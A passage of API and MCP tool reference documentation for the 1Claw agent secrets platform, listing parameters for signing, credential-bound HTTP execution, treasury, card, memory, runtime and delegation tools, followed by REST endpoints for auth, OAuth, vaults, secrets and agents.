| ---------------------- | ------- | -------- | ------- | ------------------------------------------------ |
| `agent_id`             | string  | no       |         | Agent ID (uses authenticated agent if omitted)   |
| `wallet_id`            | string  | no       | org default | Bankr wallet ID (`wlt_...`)                  |
| `ttl_seconds`          | number  | no       | 900     | Lease TTL — recommend 300–900; max 86400         |
| `llm_gateway_enabled`  | boolean | no       | true    | Enable LLM gateway access                      |
| `agent_api_enabled`    | boolean | no       | false   | Enable agent API access                          |
| `read_only`            | boolean | no       | true    | Read-only key                                    |

### sign_typed_data

Sign EIP-712 typed structured data. Agent must pass EIP-712 guardrail enforcement (domain allowlist).

| Parameter          | Type   | Required | Default               | Description                                    |
| ------------------ | ------ | -------- | --------------------- | ---------------------------------------------- |
| `agent_id`         | string | no       |                       | Agent ID (uses authenticated agent if omitted) |
| `typed_data`       | object | yes      |                       | EIP-712 object (types, primaryType, domain, message) |
| `chain`            | string | no       | `ethereum`            | Chain name                                     |
| `signing_key_path` | string | no       | auto-resolved         | Vault path to signing key (auto-resolves per-chain key) |

### sign_digest

Sign a client-computed 32-byte digest **directly** (raw/blind signing) → 65-byte `r‖s‖v` signature. For ERC-1271/ERC-7739 nested EIP-712 flows (e.g. Polymarket CLOB orders) where the canonical hash is computed client-side. Requires the agent's `raw_signing_enabled` flag (human-set; off by default); bypasses guardrails; audit-logged.

| Parameter          | Type   | Required | Default               | Description                                    |
| ------------------ | ------ | -------- | --------------------- | ---------------------------------------------- |
| `agent_id`         | string | no       |                       | Agent ID (uses authenticated agent if omitted) |
| `hash`             | string | yes      |                       | 0x-prefixed 32-byte (64 hex char) digest        |
| `chain`            | string | no       | `ethereum`            | Chain name                                     |
| `signing_key_path` | string | no       | auto-resolved         | Vault path to signing key (auto-resolves per-chain key) |

### execute_http

Execute an HTTP request via a configured execution intent binding. The binding provides credentials (injected as bearer/basic/header/query) so the agent never sees raw secrets. Requires `execution_intents_enabled` on the agent.

| Parameter      | Type   | Required | Default | Description                                         |
| -------------- | ------ | -------- | ------- | --------------------------------------------------- |
| `agent_id`     | string | no       |         | Agent ID (uses authenticated agent if omitted)      |
| `binding`      | string | yes      |         | Binding name (as configured by human)               |
| `method`       | string | no       | `GET`   | HTTP method (GET, POST, PUT, PATCH, DELETE)          |
| `path`         | string | no       |         | URL path appended to binding base URL               |
| `headers`      | object | no       |         | Additional request headers                          |
| `body`         | object | no       |         | Request body (JSON)                                 |
| `query`        | object | no       |         | Query parameters                                    |

### list_bindings

List all configured execution intent bindings for an agent. Returns binding names, types, and base URLs — never credentials.

| Parameter  | Type   | Required | Description                                    |
| ---------- | ------ | -------- | ---------------------------------------------- |
| `agent_id` | string | no       | Agent ID (uses authenticated agent if omitted) |

### rotate_generate

Generate a new random value and rotate a secret to it. Combines generation and rotation in one step.

| Parameter | Type   | Required | Default   | Description                  |
| --------- | ------ | -------- | --------- | ---------------------------- |
| `path`    | string | yes      |           | Secret path                  |
| `type`    | string | no       | `api_key` | Secret type                  |
| `length`  | number | no       | 32        | Length of the generated value |

### list_versions

List all versions of a secret. Returns version numbers, timestamps, and status.

| Parameter | Type   | Required | Description |
| --------- | ------ | -------- | ----------- |
| `path`    | string | yes      | Secret path |

### treasury_propose

Create a multisig proposal for a treasury Safe. The agent must have an active delegation for the treasury.

| Parameter          | Type   | Required | Default | Description                               |
| ------------------ | ------ | -------- | ------- | ----------------------------------------- |
| `treasury_id`      | string | yes      |         | Treasury UUID                             |
| `to`               | string | yes      |         | Destination address (0x-prefixed)         |
| `value`            | string | yes      |         | Value in ETH (e.g. `"0.01"`)             |
| `chain`            | string | yes      |         | Chain name or chain ID                    |
| `data`             | string | no       |         | Hex-encoded calldata                      |

### treasury_sign_proposal

Sign (approve or reject) a pending treasury proposal with an EIP-712 signature.

| Parameter      | Type   | Required | Default    | Description                   |
| -------------- | ------ | -------- | ---------- | ----------------------------- |
| `treasury_id`  | string | yes      |            | Treasury UUID                 |
| `proposal_id`  | string | yes      |            | Proposal UUID                 |
| `decision`     | string | no       | `approve`  | `approve` or `reject`         |

### treasury_list_proposals

List proposals for a treasury, optionally filtered by status.

| Parameter      | Type   | Required | Description                                     |
| -------------- | ------ | -------- | ----------------------------------------------- |
| `treasury_id`  | string | yes      | Treasury UUID                                   |
| `status`       | string | no       | Filter: `pending`, `approved`, `executed`, etc. |

### list_agent_accounts

List agent on-chain accounts (EOA and Safe) per chain.

| Parameter   | Type   | Required | Description                                      |
| ----------- | ------ | -------- | ------------------------------------------------ |
| `agent_id`  | string | no       | Agent UUID (defaults to authenticated agent)     |

### migrate_agent_to_safe

Build an EOA→Safe migration plan and provision a counterfactual Safe (human-only). No on-chain deploy broadcast.

| Parameter       | Type    | Required | Description                                           |
| --------------- | ------- | -------- | ----------------------------------------------------- |
| `agent_id`      | string  | yes      | Agent UUID                                            |
| `chain`         | string  | yes      | Chain name (e.g. `ethereum`, `base`, `sepolia`)       |
| `deprecate_eoa` | boolean | no       | Mark the EOA account deprecated after migration       |

### deprecate_agent_eoa

Mark the agent EOA account deprecated for a chain (human-only). Blocks direct EOA signing path.

| Parameter  | Type   | Required | Description                                |
| ---------- | ------ | -------- | ------------------------------------------ |
| `agent_id` | string | yes      | Agent UUID                                 |
| `chain`    | string | yes      | Chain name (e.g. `ethereum`, `base`)       |

### get_safe_module_registry

List pinned Safe module addresses for a chain (public, no auth required).

| Parameter | Type   | Required | Description                                |
| --------- | ------ | -------- | ------------------------------------------ |
| `chain`   | string | yes      | Chain name (e.g. `ethereum`, `base`)       |

### sync_org_safe_allowances

Reconcile org Safe allowance configs against agent guardrails (owner/admin only). Counterfactual — reports drift without on-chain broadcast. No parameters.

### platform_list_apps

List all platform apps registered in the current organization. No parameters.

### platform_create_app

Register a new platform app. Returns the app record and a one-time `plt_` API key.

| Parameter       | Type   | Required | Description                                      |
| --------------- | ------ | -------- | ------------------------------------------------ |
| `name`          | string | yes      | App display name                                 |
| `slug`          | string | yes      | Unique slug (3–64 chars, lowercase, hyphens)     |
| `description`   | string | no       | Short description                                |
| `billing_model` | string | no       | `platform_pays` (default), `user_pays`, `hybrid` |
| `auth_mode`     | string | no       | `silent`, `user_signin`, `configurable`          |

### platform_bootstrap_user

Bootstrap a connected platform user — provisions vaults, agents, policies, and signing keys from a template. Returns a claim URL the user opens to activate their account. The response also includes `summary.agent_api_key` (one-time `ocv_` key) and `summary.signing_keys[]` (each with `chain`, `address`, `public_key`, `curve`).

| Parameter       | Type   | Required | Description                                               |
| --------------- | ------ | -------- | --------------------------------------------------------- |
| `connection_id` | string | yes      | Connection ID from upsert_user or list_users              |
| `template_id`   | string | no       | Template ID to provision from (uses app default if omitted) |
| `return_to`     | string | no       | URL to redirect the user to after claiming                |
| `parameters`    | object | no       | Template variable map for bootstrap (v0.57+)              |

### platform_siwe_challenge

Get a Sign-In with Ethereum (SIWE) message + nonce for wallet-based user provisioning. Requires `plt_` platform key. Set `siwe_domain` on the platform app via `PATCH /v1/platform/apps/{id}` (human JWT for full update; **plt_ keys may only set `siwe_domain`**). Upsert with `subject_token_type: urn:1claw:params:oauth:token-type:siwe`, `siwe_message`, `siwe_signature`. Signatures accept recovery id **0/1** or **27/28** (MetaMask/viem).

| Parameter | Type   | Required | Description                    |
| --------- | ------ | -------- | ------------------------------ |
| `address` | string | yes      | EVM wallet address (0x…)       |

### platform_get_connection

Fetch connection detail (status, resource IDs, metadata). Requires `plt_` key.

| Parameter       | Type   | Required | Description   |
| --------------- | ------ | -------- | ------------- |
| `connection_id` | string | yes      | Connection UUID |

### platform_connection_usage

Usage attribution for a connected user (API calls, inference spend). Requires `plt_` key.

| Parameter       | Type   | Required | Description   |
| --------------- | ------ | -------- | ------------- |
| `connection_id` | string | yes      | Connection UUID |

### platform_list_entitlements

List on-chain entitlement watches for a connection. Requires `plt_` key.

| Parameter       | Type   | Required | Description   |
| --------------- | ------ | -------- | ------------- |
| `connection_id` | string | yes      | Connection UUID |

### platform_preview_template

Dry-run a bootstrap template with parameters (no resources created). Requires `plt_` key.

| Parameter    | Type   | Required | Description                          |
| ------------ | ------ | -------- | ------------------------------------ |
| `template_id`| string | yes      | Template UUID                        |
| `parameters` | object | no       | Template variable map                |

### order_card

Order a US prepaid card for an agent, paid via x402 using the agent's Ethereum signing key (must hold USDC on Base). Requires `cards_enabled` on the agent. Auto-generates an `Idempotency-Key`. Never returns a PAN — the response is a masked card reference with `status: pending`.

| Parameter    | Type   | Required | Description                                      |
| ------------ | ------ | -------- | ------------------------------------------------ |
| `agent_id`   | string | yes      | Agent UUID that will own and pay for the card    |
| `amount_usd` | string | yes      | USD amount to load, e.g. `"25.00"`               |
| `country`    | string | no       | Country code (defaults to US)                    |

### order_gift_card

Order a gift card for an agent (same payment flow as `order_card`). Use `search_gift_cards` first to find a `laso_server_id`.

| Parameter        | Type   | Required | Description                                  |
| ---------------- | ------ | -------- | -------------------------------------------- |
| `agent_id`       | string | yes      | Agent UUID                                   |
| `amount_usd`     | string | yes      | USD amount                                   |
| `laso_server_id` | string | no       | Gift-card brand/server id from search        |

### search_gift_cards

Search available Laso gift-card brands/servers.

| Parameter | Type   | Required | Description                        |
| --------- | ------ | -------- | ---------------------------------- |
| `query`   | string | no       | Brand/keyword filter               |
| `country` | string | no       | Country code                       |

### list_cards

List payment cards for the caller (agents see only their own). Always masked to last4 — never returns a PAN. No parameters.

### get_card_status

Get a single card's status and balance (masked). Never returns a PAN.

| Parameter | Type   | Required | Description  |
| --------- | ------ | -------- | ------------ |
| `card_id` | string | yes      | Card UUID    |

Note: revealing full card details is intentionally **not** an MCP tool (to avoid PAN exposure in the model context window). Reveal is human-gated via the dashboard, SDK, or CLI with password re-authentication.

### get_signing_key_balance

Get the native and token balances of an agent's signing key address on a specific chain.

| Parameter | Type   | Required | Description                                                       |
| --------- | ------ | -------- | ----------------------------------------------------------------- |
| `chain`   | string | yes      | Chain name (e.g. ethereum, solana, bitcoin)                       |
| `tokens`  | string | no       | Comma-separated token contract addresses for ERC-20/SPL balances  |

### execute_intent

Execute an intent through a pre-configured binding of any type. For plain HTTP prefer `execute_http`. Requires `execution_intents_enabled` on the agent.

| Parameter        | Type   | Required | Default | Description                                                              |
| ---------------- | ------ | -------- | ------- | ------------------------------------------------------------------------ |
| `binding`        | string | yes      |         | Binding name (as configured by human)                                    |
| `intent_type`    | string | no       | `http`  | Intent type matching the binding (e.g. `http`, `graphql`)                |
| `params`         | object | no       | `{}`    | Executor params (e.g. `{ query, variables }` for graphql)                |
| `execution_mode` | string | no       | `vault` | Execution surface: `vault` (standard) or `tee` (Shroud TEE, Business+)  |

### create_binding

Create a binding (credential handle) for the current agent. **Human-only** — the backend rejects agent-authenticated callers.

| Parameter           | Type   | Required | Default | Description                                                                 |
| ------------------- | ------ | -------- | ------- | --------------------------------------------------------------------------- |
| `name`              | string | yes      |         | Binding name (alphanumeric, `-`, `_`; 1–64 chars)                           |
| `binding_type`      | string | no       | `http`  | Binding type: http, graphql, etc.                                           |
| `config`            | object | no       | `{}`    | Binding config (e.g. `{ base_url, auth_type, auth_header }`)               |
| `guardrails`        | object | no       |         | Guardrails: `allowed_hosts`, `max_duration_ms`, `max_requests_per_minute`   |
| `credential`        | object | no       |         | Legacy inline credential (prefer `credential_source`)                       |
| `credential_source` | object | no       |         | `{ type: "inline", value }` or `{ type: "vault_ref", vault_id, path }`     |

### test_binding

Test connectivity for a binding. Runs through the same SSRF/allowlist checks as execution.

| Parameter    | Type   | Required | Description                                      |
| ------------ | ------ | -------- | ------------------------------------------------ |
| `binding_id` | string | yes      | The binding's UUID                               |
| `timeout_ms` | number | no       | Connectivity timeout in milliseconds (default 5000) |

### list_executions

List recent execution-intent events for the current agent: status, intent_type, duration, cost, and redactions.

| Parameter | Type   | Required | Default | Description           |
| --------- | ------ | -------- | ------- | --------------------- |
| `limit`   | number | no       | 50      | Max events to return  |
| `offset`  | number | no       | 0       | Pagination offset     |

### platform_reissue_claim

Reissue a claim URL for an already-bootstrapped connection. Use when the original 10-minute claim token has expired — no resources are re-provisioned.

| Parameter       | Type   | Required | Description                                        |
| --------------- | ------ | -------- | -------------------------------------------------- |
| `connection_id` | string | yes      | The connection ID to reissue a claim for            |
| `return_to`     | string | no       | URL to redirect the user to after claiming          |

### platform_rotate_key

Rotate the API key for a platform app. Returns a new one-time API key.

| Parameter            | Type   | Required | Description                                              |
| -------------------- | ------ | -------- | -------------------------------------------------------- |
| `app_id`             | string | yes      | The platform app ID whose key should be rotated          |
| `api_key_expires_at` | string | no       | ISO 8601 expiration timestamp for the new key            |

### list_approvals

List approval requests. Returns approvals awaiting human decision.

| Parameter | Type   | Required | Description                                                 |
| --------- | ------ | -------- | ----------------------------------------------------------- |
| `status`  | string | no       | Filter: `pending`, `approved`, `rejected`, `expired`        |
| `limit`   | number | no       | Max approvals to return (default 20)                        |

### get_approval

Get details of a specific approval request.

| Parameter     | Type   | Required | Description                    |
| ------------- | ------ | -------- | ------------------------------ |
| `approval_id` | string | yes      | UUID of the approval request   |

### request_approval

Request human approval for a policy change or sensitive action. Agent-only — creates a pending approval directed to the agent's creator.

| Parameter     | Type   | Required | Default | Description                                                                   |
| ------------- | ------ | -------- | ------- | ----------------------------------------------------------------------------- |
| `action`      | string | yes      |         | Action type (e.g. `policy_change`, `access_request`)                          |
| `target_type` | string | yes      |         | Target resource type (e.g. `policy`, `vault`, `secret`)                       |
| `target_id`   | string | yes      |         | ID of the target resource                                                     |
| `summary`     | object | yes      |         | JSON summary of the change (for `policy_change`: `{ vault_id, paths, ... }`)  |
| `reason`      | string | no       |         | Human-readable reason                                                         |
| `risk_tier`   | number | no       | 1       | Risk level 1–5 (1=low, 5=critical)                                           |

### memory_put

Store a memory entry for the agent (scratch, durable, or semantic tier).

| Parameter | Type   | Required | Default    | Description                                          |
| --------- | ------ | -------- | ---------- | ---------------------------------------------------- |
| `key`     | string | yes      |            | Memory key identifier                                |
| `value`   | string | yes      |            | Memory value (text content)                          |
| `tier`    | string | no       | `durable`  | Memory tier: `scratch`, `durable`, or `semantic`     |
| `metadata`| object | no       |            | Optional JSON metadata                               |

### memory_get

Retrieve a memory entry by key.

| Parameter | Type   | Required | Description      |
| --------- | ------ | -------- | ---------------- |
| `key`     | string | yes      | Memory key       |

### memory_list

List memory entries, optionally filtered by tier.

| Parameter | Type   | Required | Description                                      |
| --------- | ------ | -------- | ------------------------------------------------ |
| `tier`    | string | no       | Filter by tier: `scratch`, `durable`, `semantic` |
| `limit`   | number | no       | Max entries to return (default 50)               |

### memory_search

Semantic vector search over agent memory entries (semantic tier only).

| Parameter   | Type   | Required | Default | Description                             |
| ----------- | ------ | -------- | ------- | --------------------------------------- |
| `query`     | string | yes      |         | Natural language search query           |
| `limit`     | number | no       | 10      | Max results                             |
| `threshold` | number | no       | 0.7     | Minimum similarity score (0.0–1.0)      |

### delete_memory

Delete a memory entry by key.

| Parameter | Type   | Required | Description      |
| --------- | ------ | -------- | ---------------- |
| `key`     | string | yes      | Memory key       |

### list_automations

List automations for the org.

| Parameter | Type   | Required | Description                                   |
| --------- | ------ | -------- | --------------------------------------------- |
| `status`  | string | no       | Filter: `active`, `paused`, `disabled`        |

### trigger_automation

Manually trigger an automation run.

| Parameter       | Type   | Required | Description              |
| --------------- | ------ | -------- | ------------------------ |
| `automation_id` | string | yes      | UUID of the automation   |
| `payload`       | object | no       | Optional trigger payload |

### create_agent_automation

Create a simple automation for the calling agent (manual/webhook; log, notify, memory, wait steps only).

| Parameter        | Type    | Required | Description                                      |
| ---------------- | ------- | -------- | ------------------------------------------------ |
| `name`           | string  | yes      | Short automation name                            |
| `trigger_type`   | string  | no       | `manual` (default) or `webhook`                  |
| `workflow_spec`  | object  | yes      | Steps array or `{ "steps": [...] }`              |
| `auto_trigger`   | boolean | no       | Run immediately after create (manual only)       |

### list_runtimes

List cloud runtimes for the org.

| Parameter | Type   | Required | Description                                          |
| --------- | ------ | -------- | ---------------------------------------------------- |
| `status`  | string | no       | Filter: `running`, `stopped`, `deploying`, `error`   |

### manage_runtime

Start or stop a cloud runtime.

| Parameter    | Type   | Required | Description                    |
| ------------ | ------ | -------- | ------------------------------ |
| `runtime_id` | string | yes      | UUID of the runtime            |
| `action`     | string | yes      | `start` or `stop`             |

### runtime_status

Get the current status and health of a runtime.

| Parameter    | Type   | Required | Description         |
| ------------ | ------ | -------- | ------------------- |
| `runtime_id` | string | yes      | UUID of the runtime |

### runtime_logs

Stream recent logs from a cloud runtime.

| Parameter    | Type   | Required | Default | Description                    |
| ------------ | ------ | -------- | ------- | ------------------------------ |
| `runtime_id` | string | yes      |         | UUID of the runtime            |
| `lines`      | number | no       | 100     | Number of recent lines         |
| `follow`     | boolean| no       | false   | Stream new logs in real-time   |

### Runtime Tool Registry (v0.45)

Cloud Runtimes include 12 pluggable tool modules that can be enabled/disabled per runtime template:

| Module | Description |
| ------ | ----------- |
| `image-gen` | Image generation (DALL-E, Stable Diffusion) |
| `web-search` | Web search and URL fetching |
| `memory-tools` | Agent memory read/write/search |
| `file-handler` | File upload, download, and processing |
| `code-exec` | Code execution sandbox |
| `google-tools` | Google Workspace integration (Docs, Sheets, Calendar) |
| `github-tools` | GitHub API access (issues, PRs, repos) |
| `slack-tools` | Slack messaging and channel management |
| `social-tools` | Social media integrations (X/Twitter, LinkedIn) |
| `vault-tools` | 1Claw vault secret access |
| `notify-tools` | Notifications (email, SMS, push) |
| `sub-agents` | Sub-agent discovery, delegation, and task management |

Per-template tool configs (`hermes`, `openclaw`, `openclaude`) define default enabled tools for each runtime template. Dashboard `RuntimeToolsCard` shows active tools and allows toggling per runtime.

### Sub-Agent Framework & Delegation (v0.46)

Runtime tools for inter-agent coordination (requires the `sub-agents` tool module):

| Tool | Description |
| ---- | ----------- |
| `discover_agents` | Search the org agent directory for agents with specific capabilities |
| `delegate_task` | Send a task to another agent via agent-to-agent chat (requires active delegation) |
| `list_my_sub_agents` | List agents in the same org with delegation authorization status |
| `create_sub_task` | Trigger an automation on a sub-agent (orchestrator pattern) |
| `get_delegation_status` | Check which agents the caller is authorized to delegate to |

The sub-agent framework enables orchestrator-worker patterns where a primary agent discovers specialist agents via `GET /v1/agents/org-directory`, delegates tasks via agent-to-agent chat (`POST /v1/agents/{id}/chat`), and supervises execution.

#### Agent-to-Agent Delegation (v0.46)

Human-controlled authorization framework. Agents **cannot** delegate to other agents without an explicit `agent_delegations` record created by a human. Agents cannot create, modify, or revoke their own delegations (403).

**Delegation modes:**
- `caller` (default) — delegate executes with its own credentials and tools (most secure)
- `target` — delegate executes with the target agent's configuration
- `both` — either mode can be requested per invocation

**Security model:**
- Self-delegation is rejected (400)
- Tool allowlist/blocklist enforced per delegation
- Daily rate limit (`max_daily_delegations`) enforced via `delegation_events` count
- Depth limit (`max_depth`, 1–10) prevents recursive delegation chains (tracked via `X-Delegation-Depth` header)
- Expired delegations rejected (403)
- All mutations audit-logged: `agent.delegation.created`, `.updated`, `.revoked`, `.invoked`, `.blocked`

**Chat enforcement:** Cross-agent `POST /v1/agents/{id}/chat` requires active, non-expired delegation from caller to target. Delegation engine checks tool allowlist, daily rate limit, and depth limit.

**Endpoints:**

| Method | Path | Description |
| ------ | ---- | ----------- |
| `POST` | `/v1/agents/{id}/delegations` | Create delegation (human-only) |
| `GET` | `/v1/agents/{id}/delegations` | List delegations (human: all; agent: own) |
| `GET` | `/v1/agents/{id}/delegations/effective` | Agent-callable — delegations where agent is delegator |
| `GET` | `/v1/agents/{id}/delegations/{did}` | Get delegation details |
| `PATCH` | `/v1/agents/{id}/delegations/{did}` | Update delegation (human-only) |
| `DELETE` | `/v1/agents/{id}/delegations/{did}` | Revoke delegation (human-only) |

**SDK:** `client.agents.createDelegation()`, `.listDelegations()`, `.getDelegation()`, `.updateDelegation()`, `.revokeDelegation()`, `.getEffectiveDelegations()`.

**MCP:** `list_delegations`, `create_delegation`, `get_effective_delegations`.

**CLI:** `1claw agent delegation create|list|get|update|revoke <agent-id>`.

**Dashboard:** Sub-agent creation wizard at `/agents/sub-agent-wizard` (4-step flow, 6 role presets: Research, Image Gen, Treasury, Comms, Code, Custom). Delegations tab on agent detail page (outbound/inbound tables with create/edit/revoke dialogs). Sub-Agents card on runtime detail page with authorization badges.

### search_directory

Search the public agent discovery directory.

| Parameter  | Type   | Required | Description                                |
| ---------- | ------ | -------- | ------------------------------------------ |
| `query`    | string | no       | Search term                                |
| `category` | string | no       | Filter by category                         |
| `limit`    | number | no       | Max results (default 20)                   |

### send_chat_message

Send a message to an agent and get a response via Shroud LLM proxy.

| Parameter         | Type   | Required | Description                                |
| ----------------- | ------ | -------- | ------------------------------------------ |
| `agent_id`        | string | yes      | Agent UUID                                 |
| `message`         | string | yes      | Message content                            |
| `conversation_id` | string | no       | Existing conversation (creates new if omitted) |
| `model`           | string | no       | LLM model override                         |
| `provider`        | string | no       | LLM provider override                      |

### list_chat_conversations

List chat conversations for an agent.

| Parameter  | Type   | Required | Description                                |
| ---------- | ------ | -------- | ------------------------------------------ |
| `agent_id` | string | yes      | Agent UUID                                 |

### create_channel

Create a messaging channel for an agent (Telegram, WhatsApp, or Discord).

| Parameter       | Type   | Required | Description                                |
| --------------- | ------ | -------- | ------------------------------------------ |
| `agent_id`      | string | yes      | Agent UUID                                 |
| `channel_type`  | string | yes      | `telegram`, `whatsapp`, or `discord`       |
| `channel_name`  | string | yes      | Display name for the channel               |
| `metadata`      | object | no       | Platform-specific config (bot token, etc.) |

### list_channels

List messaging channels for an agent.

| Parameter  | Type   | Required | Description                                |
| ---------- | ------ | -------- | ------------------------------------------ |
| `agent_id` | string | yes      | Agent UUID                                 |

### send_channel_message

Send a message via a configured messaging channel.

| Parameter    | Type   | Required | Description                                |
| ------------ | ------ | -------- | ------------------------------------------ |
| `agent_id`   | string | yes      | Agent UUID                                 |
| `channel_id` | string | yes      | Channel UUID                               |
| `message`    | string | yes      | Message content                            |

### list_oauth_providers

List all available OAuth providers from the registry (Google, GitHub, Slack, etc.).

No parameters required.

### list_oauth_connections

List OAuth connected accounts for an agent.

| Parameter    | Type   | Required | Description                                |
| ------------ | ------ | -------- | ------------------------------------------ |
| `agent_id`   | string | yes      | Agent UUID                                 |

---

## REST API Quick Reference

Base URL: `https://api.1claw.xyz`. All authenticated endpoints require `Authorization: Bearer <token>`.

### Auth (public — no token required)

| Method | Path                    | Description                                           |
| ------ | ----------------------- | ----------------------------------------------------- |
| `POST` | `/v1/auth/token`        | Login (email + password) → `{ access_token }`         |
| `POST` | `/v1/auth/agent-token`  | Agent login (agent_id + api_key) → `{ access_token }` |
| `POST` | `/v1/auth/federated-token` | RFC 8693 token exchange → RS256 JWT for external relying parties |
| `POST` | `/v1/auth/google`       | Google OAuth (ID token verified via JWKS)             |
| `POST` | `/v1/auth/signup`       | Create account → sends verification email             |
| `POST` | `/v1/auth/verify-email` | Verify email token → creates user                     |
| `POST` | `/v1/auth/mfa/verify`   | Verify MFA code during login                          |
| `POST` | `/v1/auth/passkeys/assert/begin` | Start passkey login (accepts `{ email }`)    |
| `POST` | `/v1/auth/passkeys/assert/complete` | Complete passkey login → JWT              |
| `POST` | `/v1/auth/email-otp/send`  | Send 6-digit OTP code to email (5-min TTL)          |
| `POST` | `/v1/auth/email-otp/verify`| Verify OTP → JWT + user_id + wallet_address          |
| `POST` | `/v1/oauth/token`          | Exchange auth code for access_token + id_token       |
| `GET`  | `/.well-known/openid-configuration` | OIDC discovery (issuer, jwks_uri, supported algs) |
| `GET`  | `/.well-known/jwks.json` | Public JWKS (EdDSA + RS256 key versions, keyed by `kid`) |

### Auth (authenticated)

| Method   | Path                       | Description                                                      |
| -------- | -------------------------- | ---------------------------------------------------------------- |
| `GET`    | `/v1/auth/me`              | Get current user profile                                         |
| `PATCH`  | `/v1/auth/me`              | Update profile (`display_name`, `marketing_emails`)              |
| `DELETE` | `/v1/auth/me`              | Delete account (body: `{ "confirmation": "DELETE MY ACCOUNT" }`) |
| `DELETE` | `/v1/auth/token`           | Revoke current token                                             |
| `POST`   | `/v1/auth/change-password` | Change password                                                  |
| `POST`   | `/v1/auth/set-password`    | Set first password (platform OIDC/Google users only)             |
| `POST`   | `/v1/auth/change-email`    | Initiate email change (sends code to new address)                |
| `POST`   | `/v1/auth/verify-email-change` | Complete email change with verification code                 |
| `POST`   | `/v1/auth/passkeys/register/begin` | Start passkey registration ceremony                    |
| `POST`   | `/v1/auth/passkeys/register/complete` | Complete passkey registration                       |
| `GET`    | `/v1/auth/passkeys`        | List registered passkeys                                         |
| `DELETE` | `/v1/auth/passkeys/{id}`   | Delete a passkey                                                 |
| `POST`   | `/v1/auth/export-data`     | GDPR data export (returns JSON archive of user's personal data)  |
| `POST`   | `/v1/auth/email-otp/send`  | Send 6-digit OTP code to email (public, 5-min TTL)               |
| `POST`   | `/v1/auth/email-otp/verify`| Verify OTP code → JWT + user_id + wallet_address (public)        |
| `GET`    | `/v1/oauth/authorize`      | Get OAuth consent info (app_name, scopes, already_consented)     |
| `POST`   | `/v1/oauth/authorize`      | Approve/deny OAuth authorization (issues authorization code)     |
| `POST`   | `/v1/oauth/token`          | Exchange authorization code for access_token + id_token (public) |
| `GET`    | `/v1/oauth/userinfo`       | Get user info (sub, email, name, wallet_address; scope-filtered) |
| `POST`   | `/v1/oauth/revoke`         | Revoke access_token or refresh_token (RFC 7009, public)          |
| `DELETE`  | `/v1/oauth/consent/{app_slug}` | Revoke all consent and tokens for an app (user-only)         |

**OAuth2 refresh tokens:** Request `offline_access` scope during authorization to receive a `refresh_token` alongside `access_token` + `id_token`. Exchange refresh tokens via `POST /v1/oauth/token` with `grant_type=refresh_token`. Each exchange returns a new access/refresh token pair (rotation). Revoke any token via `POST /v1/oauth/revoke` with `{ token, token_type_hint? }`. UserInfo (`GET /v1/oauth/userinfo`) filters returned fields by scopes granted during authorization — `email` scope for email, `profile` scope for name.

### OAuth Connected Accounts

| Method   | Path                                                     | Description                                                     |
| -------- | -------------------------------------------------------- | --------------------------------------------------------------- |
| `GET`    | `/v1/oauth/providers`                                    | List available OAuth providers (public, no auth)                |
| `POST`   | `/v1/agents/{id}/oauth/connect`                          | Initiate OAuth flow for agent (human-only, returns auth URL)    |
| `GET`    | `/v1/agents/{id}/oauth/connections`                      | List agent's OAuth connections                                  |
| `POST`   | `/v1/agents/{id}/oauth/disconnect/{bindingId}`           | Revoke tokens and delete binding (human-only)                   |
| `POST`   | `/v1/agents/{id}/oauth/app-credentials`                  | Save OAuth app credentials (human-only, secret encrypted)       |
| `GET`    | `/v1/agents/{id}/oauth/app-credentials`                  | List OAuth app credentials (secrets redacted)                   |
| `DELETE` | `/v1/agents/{id}/oauth/app-credentials/{providerSlug}`   | Delete OAuth app credentials                                    |
| `GET`    | `/v1/oauth/callback`                                     | Public OAuth provider redirect callback                         |

### Vaults

| Method   | Path                                   | Description                                                           |
| -------- | -------------------------------------- | --------------------------------------------------------------------- |
| `POST`   | `/v1/vaults`                           | Create vault (`{ name, description? }`) → `201`                       |
| `GET`    | `/v1/vaults`                           | List vaults → `{ vaults: [...] }`                                     |
| `GET`    | `/v1/vaults/{id}`                      | Get vault details                                                     |
| `DELETE` | `/v1/vaults/{id}`                      | Delete vault → `204`                                                  |
| `POST`   | `/v1/vaults/{id}/cmek`                 | Enable CMEK (`{ fingerprint }`)                                       |
| `DELETE` | `/v1/vaults/{id}/cmek`                 | Disable CMEK                                                          |
| `POST`   | `/v1/vaults/{id}/cmek-rotate`          | Start CMEK key rotation (headers: `X-CMEK-Old-Key`, `X-CMEK-New-Key`) |
| `GET`    | `/v1/vaults/{id}/cmek-rotate/{job_id}` | Get rotation job status                                               |

### Secrets

| Method   | Path                                 | Description                                                                                |
| -------- | ------------------------------------ | ------------------------------------------------------------------------------------------ |
| `PUT`    | `/v1/vaults/{id}/secrets/{path}`     | Store/update secret (`{ type, value, metadata?, expires_at?, max_access_count? }`) → `201` |
| `GET`    | `/v1/vaults/{id}/secrets/{path}`     | Read secret → `{ path, type, value, version, metadata }`                                   |
| `DELETE` | `/v1/vaults/{id}/secrets/{path}`     | Delete secret → `204`                                                                      |
| `GET`    | `/v1/vaults/{id}/secrets?prefix=...` | List secrets (metadata only, no values)                                                    |
| `GET`    | `/v1/vaults/{id}/secret-versions/{path}` | List all versions of a secret                                                          |
| `GET`    | `/v1/vaults/{id}/secret-version/{path}/{version}` | Get a specific secret version                                                  |
| `POST`   | `/v1/vaults/{id}/secret-version-disable/{path}/{version}` | Disable a secret version                                                        |
| `POST`   | `/v1/vaults/{id}/secret-rotate/{path}` | Server-side secret rotation                                                            |

### Agents

| Method   | Path                                   | Description                                                                |
| -------- | -------------------------------------- | -------------------------------------------------------------------------- |
| `POST`   | `/v1/agents`                           | Create agent → `{ agent: {...}, api_key: "ocv_..." }`                      |
| `GET`    | `/v1/agents`                           | List agents → `{ agents: [...] }`                                          |
| `GET`    | `/v1/agents/{id}`                      | Get agent                                                                  |
| `GET`    | `/v1/agents/me`                        | Get current agent (self)                                                   |
| `PATCH`  | `/v1/agents/{id}`                      | Update agent (is_active, scopes, intents_api_enabled, guardrails) — **user-only; agents cannot PATCH their own record** |
| `DELETE` | `/v1/agents/{id}`                      | Delete agent → `204`                                                       |
| `POST`   | `/v1/agents/{id}/rotate-key`           | Rotate agent API key → `{ api_key: "ocv_..." }`                            |
| `POST`   | `/v1/agents/{id}/rotate-identity-keys` | Rotate agent SSH + ECDH keypairs (user-only; keys in `__agent-keys` vault) |
| `POST`   | `/v1/agents/{id}/bankr-keys/lease`     | Lease Bankr key (privileged; policy on `agents/{id}/bankr/*`; agent response omits `api_key`) |
| `GET`    | `/v1/agents/{id}/bankr-keys`           | List active Bankr key leases for agent                                      |
